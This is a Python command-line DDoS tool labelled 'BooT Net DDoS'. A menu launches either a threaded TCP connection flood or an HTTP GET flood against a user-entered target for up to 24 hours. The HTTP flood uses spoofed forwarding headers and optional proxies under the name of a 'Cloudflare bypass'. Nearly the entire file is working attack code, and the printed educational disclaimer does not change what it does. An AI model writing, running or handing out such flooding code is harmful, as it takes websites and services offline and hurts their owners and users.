import socket
import threading
import time
import requests
from colorama import init, Fore, Style
import sys
import random

init()

def print_ascii_art():
    art = f"""
{Fore.RED}
                        )                                              )               (     (                
   (          *   )  ( /(                    (              *   )   ( /(           )   )\ )  )\ )              
   )\  (     )  /(  )\())  (   (          ( )\            )  /(   )\())   (   ( /(  (()/( (()/(              
 (((_) )\ )  ( )(_))((_)\  ))\  )(    (    )((_)  (    (   ( )(_)) ((_)\   ))\  )\())  /(_)) /(_))   (   (    
 )\___(()/( (_(_())  _((_)/((_)(()\   )\  ((_)_   )\   )\ (_(_())   _((_) /((_)(_))/  (_))_ (_))_    )\  )\   
((/ __|)(_))|_   _| |_  /(_))   ((_) ((_)  | _ ) ((_) ((_)|_   _|  | \| |(_))  | |_    |   \ |   \  ((_)((_)  
 | (__| || |  | |    / / / -_) | '_|/ _ \  | _ \/ _ \/ _ \  | |    | . |/ -_) |  _|   | |) || |) |/ _ \(_-<  
  \___|\_, |  |_|   /___|\___| |_|  \___/  |___/\___/\___/  |_|    |_|\_|\___|  \__|   |___/ |___/ \___//__/  
       |__/                                                                                                  
                                        Code By CyTZero
                                  BooT Net DDoS    
{Style.RESET_ALL}
    """
    print(art)

def print_disclaimer():
    disclaimer = """
DISCLAIMER:
This script is intended for educational purposes and responsible testing only.
Using this script to perform unauthorized actions, such as a Distributed Denial of Service (DDoS) attack or any other malicious activity, is illegal and unethical. Ensure that you have explicit permission from the server owner before performing any tests.

The author of this script accepts no responsibility for any misuse or damage caused by the use of this script. Use it at your own risk and comply with all relevant laws and regulations.
"""
    print(disclaimer)

def loading_animation(duration=5):
    end_time = time.time() + duration
    spinner = ['|', '/', '-', '\\']
    while time.time() < end_time:
        for symbol in spinner:
            sys.stdout.write(f'\rAttack in progress... {symbol}')
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write('\rLaunch Attack......      \n')
    sys.stdout.flush()

def send_tcp_request(host, port, request_id):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((host, port))
            # Trimitem un payload mai mare pentru un impact mai mare
            payload = b'X' * 1024  # 1KB de date
            s.sendall(payload)
            response = s.recv(1024)
            print(f"{Fore.GREEN}[{request_id}] TCP request successful to {host}:{port}{Style.RESET_ALL}")
    except socket.error as e:
        print(f"{Fore.RED}[{request_id}] TCP request failed to {host}:{port}: {e}{Style.RESET_ALL}")

def bypass_cloudflare(url):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'X-Forwarded-For': f'{".".join(map(str, [random.randint(1, 255) for _ in range(4)]))}',
            'X-Real-IP': f'{".".join(map(str, [random.randint(1, 255) for _ in range(4)]))}',
        }
        return headers
    except Exception as e:
        print(f"{Fore.RED}Error generating Cloudflare bypass headers: {e}{Style.RESET_ALL}")
        return {}

def send_http_request(url, request_id, proxies=None):
    try:
        headers = bypass_cloudflare(url)
        response = requests.get(url, timeout=5, proxies=proxies, headers=headers)
        if response.status_code == 200:
            print(f"{Fore.GREEN}[{request_id}] HTTP request to {url} responded with status code: {response.status_code} (Bypass Success){Style.RESET_ALL}")
        elif response.status_code == 503:
            print(f"{Fore.RED}[{request_id}] HTTP request to {url} responded with status code: {response.status_code} (Cloudflare Detected){Style.RESET_ALL}")
        else:
            print(f"[{request_id}] HTTP request to {url} responded with status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[{request_id}] HTTP request to {url} failed: {e}")

def send_multiple_tcp_requests(host, port, num_requests, duration=86400):
    total_requests = num_requests * 999999
    start_time = time.time()
    while time.time() - start_time < duration:
        threads = []
        for i in range(total_requests):
            thread = threading.Thread(target=send_tcp_request, args=(host, port, i + 1))
            threads.append(thread)
            thread.start()
            time.sleep(0.001)  # Mic delay pentru a evita supraîncărcarea
        for thread in threads:
            thread.join()

def send_multiple_http_requests(url, num_requests, duration=86400, proxies=None):
    total_requests = num_requests * 999999  
    start_time = time.time()
    while time.time() - start_time < duration:
        threads = []
        for i in range(total_requests):
            thread = threading.Thread(target=send_http_request, args=(url, i + 1, proxies))
            threads.append(thread)
            thread.start()
            time.sleep(0.00) 
        for thread in threads:
            thread.join() 

def animation_loop(message):
    while True:
        for symbol in ['-', '\\', '|', '/']:
            sys.stdout.write(f'\r{message} {symbol}')
            sys.stdout.flush()
            time.sleep(0.1)

if __name__ == "__main__":
    print_ascii_art()
    print_disclaimer()
    
    while True:
        print(f"\n{Fore.CYAN}=== MENU ===")
        print(f"{Fore.GREEN}1. Layer 4 (TCP) Attack")
        print(f"2. Layer 7 (HTTP/Cloudflare Bypass) Attack")
        print(f"3. Exit{Style.RESET_ALL}")
        print(f"{Fore.CYAN}============{Style.RESET_ALL}\n")
        
        choice = input(f"{Fore.YELLOW}Select your option (1-3): {Style.RESET_ALL}")
        
        if choice == '1':
            host = input(f"{Fore.GREEN}Target IP/Hostname: {Style.RESET_ALL}")
            port = int(input(f"{Fore.GREEN}Target Port (default 80): {Style.RESET_ALL}") or "80")
            num_requests = int(input(f"{Fore.GREEN}Base number of requests: {Style.RESET_ALL}"))
            
            if num_requests <= 0:
                print(f"{Fore.RED}Number of requests must be positive.{Style.RESET_ALL}")
                continue
                
            print(f"\n{Fore.YELLOW}Starting Layer 4 attack...{Style.RESET_ALL}\n")
            loading_animation()
            try:
                threading.Thread(target=send_multiple_tcp_requests, args=(host, port, num_requests)).start()
                animation_loop("Sending TCP requests...")
            except KeyboardInterrupt:
                print(f"\n{Fore.RED}Layer 4 attack stopped by user.{Style.RESET_ALL}")
                
        elif choice == '2':
            url = input("Target URL: ")
            num_requests = int(input("Base number of requests: "))
            use_proxies = input("Use proxy? (y/n): ").strip().lower()
            proxies = None
            if use_proxies == 'y':
                proxy = input("Enter proxy (e.g., http://username:password@proxyserver:port): ")
                proxies = {
                    'http': proxy,
                    'https': proxy,
                }
            if num_requests <= 0:
                print("Number of requests must be positive.")
            else:
                print("Starting Layer 7 test...\n")
                loading_animation()
                try:
                    threading.Thread(target=send_multiple_http_requests, args=(url, num_requests, 86400, proxies)).start()
                    animation_loop("Sending HTTP requests...")
                except KeyboardInterrupt:
                    print("\nLayer 7 testing stopped by user.")
                
        elif choice == '3':
            print(f"\n{Fore.YELLOW}Exiting program...{Style.RESET_ALL}")
            break
            
        else:
            print(f"{Fore.RED}Invalid option. Please choose 1, 2, or 3.{Style.RESET_ALL}") 
